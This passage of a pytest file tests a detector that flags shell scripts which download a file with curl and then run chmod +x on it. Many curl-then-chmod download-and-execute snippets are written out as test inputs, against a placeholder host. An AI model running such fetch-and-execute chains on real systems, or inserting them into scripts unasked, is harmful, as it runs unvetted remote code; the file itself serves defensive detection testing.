    pytest.param('.sh', 'curl -o /tmp/x https://h/x &> /dev/null\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='amp_gt'),
    pytest.param('.sh', 'curl -o /tmp/x https://h/x >&2\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='gt_amp2'),
    pytest.param('.sh', 'curl -o /tmp/x https://h/x |& tee log\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='pipe_amp'),
    pytest.param('.sh', 'curl "https://h/p?a=1&b=2" -o /tmp/x\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='url_amp_before'),
    pytest.param('.sh', "curl 'https://h/p?a=1&b=2' -fsSL -o /tmp/x\nchmod +x /tmp/x\n", ['download-chmod-execute'], id='url_amp_before_sq'),
    pytest.param('.sh', 'curl -o /tmp/x "https://h/p?a=1&b=2"\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='url_amp_after'),
    pytest.param('.sh', "curl -O 'https://h/p/tool?a=1&b=2'\nchmod +x tool\n", ['download-chmod-execute'], id='url_amp_O'),
    pytest.param('.sh', 'curl -H "Accept: text/html; q=1" -o /tmp/x https://h/x\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='header_semicolon_before'),
    pytest.param('.sh', "curl -H 'X: a|b' -o /tmp/x https://h/x\nchmod +x /tmp/x\n", ['download-chmod-execute'], id='header_pipe_before'),
    pytest.param('.sh', "curl -H 'X: a&b' -o /tmp/x https://h/x\nchmod +x /tmp/x\n", ['download-chmod-execute'], id='header_amp_before'),
    pytest.param('.sh', "curl -d 'a=1&b=2' -o /tmp/x https://h/x\nchmod +x /tmp/x\n", ['download-chmod-execute'], id='data_amp_before'),
    pytest.param('.sh', "curl -w '%{http_code}|%{size}' -o /tmp/x https://h/x\nchmod +x /tmp/x\n", ['download-chmod-execute'], id='w_pipe_before'),
    pytest.param('.sh', '( curl -o /tmp/x https://h/x )\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='subshell'),
    pytest.param('.sh', 'r=$(curl -o /tmp/x https://h/x)\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='dollar_subshell'),
    pytest.param('.sh', 'echo $(curl -o /tmp/x https://h/x)\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='dollar_subshell2'),
    pytest.param('.sh', 'OUT=$(curl -fsSL -o /tmp/x https://h/x)\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='assign_prefix'),
    pytest.param('.sh', 'curl -o /tmp/x https://h/x &\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='background'),
    pytest.param('.sh', 'curl -o /tmp/x https://h/x & chmod +x /tmp/x\n', ['download-chmod-execute'], id='background_same'),
    pytest.param('.sh', 'curl -o /tmp/x https://h/x & wait; chmod +x /tmp/x\n', ['download-chmod-execute'], id='bg_wait'),
    pytest.param('.sh', 'if ! curl -o /tmp/x https://h/x; then exit 1; fi\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='if_not'),
    pytest.param('.sh', '{ curl -o /tmp/x https://h/x; }\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='brace'),
    pytest.param('.sh', 'timeout 30 curl -o /tmp/x https://h/x\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='timeout'),
    pytest.param('.sh', 'FOO=1 curl -o /tmp/x https://h/x\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='env_prefix'),
    pytest.param('.sh', 'retry 3 curl -o /tmp/x https://h/x\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='retry_fn'),
    pytest.param('.sh', '!curl -o /tmp/x https://h/x\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='bang'),
    pytest.param('.sh', 'x=`curl -o /tmp/x https://h/x`\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='backtick'),
    pytest.param('.sh', 'curl -o /tmp/x "https://h/x;v=1"\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='quoted_semicolon_url'),
    pytest.param('.sh', 'curl -o "/tmp/a&b" https://h/x\nchmod +x "/tmp/a&b"\n', ['download-chmod-execute'], id='quoted_amp_path'),
    pytest.param('.sh', 'curl -o /tmp/x https://h/x&\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='trailing_amp_after_o'),
    pytest.param('.sh', 'curl -o /tmp/x; chmod +x /tmp/x\n', ['download-chmod-execute'], id='oglued_semi'),
    pytest.param('.sh', "alias dl='curl -o /tmp/x https://h/x'\nchmod +x /tmp/x\n", ['download-chmod-execute'], id='alias_curl'),
    pytest.param('.sh', 'wget -qO- https://h/a | curl -o /tmp/x https://h/x\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='pipe_wget_curl'),
    pytest.param('.sh', '(curl -o /tmp/x https://h/x)\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='paren_glue'),
    pytest.param('.sh', "sh -c 'curl -o /tmp/x https://h/x'\nchmod +x /tmp/x\n", ['download-chmod-execute'], id='quote_glue'),
    pytest.param('.sh', 'sh -c "curl -o /tmp/x https://h/x"\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='dquote_glue'),
    pytest.param('.sh', 'bash -c "curl -o /tmp/x https://h/x && chmod +x /tmp/x"\n', ['download-chmod-execute'], id='env_c'),
    pytest.param('.sh', "curl -o /tmp/x 'https://h/x?a=b|c'\nchmod +x /tmp/x\n", ['download-chmod-execute'], id='url_pipe_in_query'),
    pytest.param('.sh', 'curl https://h/x?a=1\\&b=2 -o /tmp/x\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='curl_url_first_amp'),
    pytest.param('.zsh', 'curl -o /tmp/x https://h/x\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='zshcase_zsh'),
    # PR #1048 final review: relative downloads run by a directory-qualified path
    pytest.param('.sh', '#!/bin/sh\ncd /opt/app/bin && curl -fsSL https://h/tool -o tool\nchmod +x /opt/app/bin/tool\n', ['download-chmod-execute'], id='cd_then_absolute_chmod'),
    pytest.param('.sh', '#!/bin/sh\ncd /usr/local/bin\ncurl -fsSLO https://h/tool\nsudo chmod +x /usr/local/bin/tool\n', ['download-chmod-execute'], id='remote_name_then_absolute_chmod'),
    pytest.param('.sh', '#!/bin/sh\ncd "$DIR" && curl -fsSL https://h/tool -o tool\nchmod +x "$DIR/tool"\n', ['download-chmod-execute'], id='cd_var_then_var_dir_chmod'),
]

# Known FALSE positives that 49f3b373 also reported and this guard deliberately keeps (curl named
# as an argument or inside a string, not run): pinned in their own list so that nobody mistakes
# them for detections to protect, and so a fix that silences them is a visible, deliberate change.
_KNOWN_FPS_PRESERVED_SINCE_49F3B373 = [
    pytest.param('.sh', 'echo curl -o /tmp/x https://h/x\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='echo_curl'),
    pytest.param('.sh', 'echo "curl -o /tmp/x https://h/x"\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='echo_quoted'),
    pytest.param('.sh', 'grep curl -o /tmp/x notes\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='grep_curl'),
    pytest.param('.sh', 'man curl -o /tmp/x\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='man_curl'),
]

_INTENDED_DROPS_SINCE_49F3B373 = [
    pytest.param('curl -o - https://h/x\nchmod +x -\n', id='dash_target'),
    pytest.param('curl -o /dev/null https://h/x\nchmod +x /dev/null\n', id='devnull'),
    pytest.param('curl -o /tmp/x https://h/x\n./do && ./tmp/x\n', id='run_andand'),
    pytest.param('curl -o out https://h/x\nchmod +x ./layout.sh\n', id='substr_old_fp'),
]


@pytest.mark.parametrize(("suffix", "body", "rules"), _FIRED_AT_49F3B373)
def test_every_shape_49f3b373_reported_is_still_reported(
    tmp_path: Path, suffix: str, body: str, rules: list[str]
) -> None:
    (tmp_path / f"script{suffix}").write_text(body, encoding="utf-8")
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert sorted({f.rule.split("/")[1] for f in findings}) == rules



@pytest.mark.parametrize(("suffix", "body", "rules"), _KNOWN_FPS_PRESERVED_SINCE_49F3B373)
def test_known_fps_preserved_since_49f3b373_still_report(
    tmp_path: Path, suffix: str, body: str, rules: list[str]
) -> None:
    # Not detections: `echo curl ...`, `grep curl ...`, `man curl ...` mention curl without running
    # it. Kept as they were at 49f3b373 (a command-word model of every wrapper is out of scope).
    (tmp_path / f"script{suffix}").write_text(body, encoding="utf-8")
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert sorted({f.rule.split("/")[1] for f in findings}) == rules

@pytest.mark.parametrize("body", _INTENDED_DROPS_SINCE_49F3B373)
def test_the_documented_drops_since_49f3b373_stay_silent(tmp_path: Path, body: str) -> None:
    # `-` and /dev/null are not files, `out` is not `./layout.sh`, `./tmp/x` is not `/tmp/x`.
    (tmp_path / "script.sh").write_text(body, encoding="utf-8")
    assert DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path)) == []
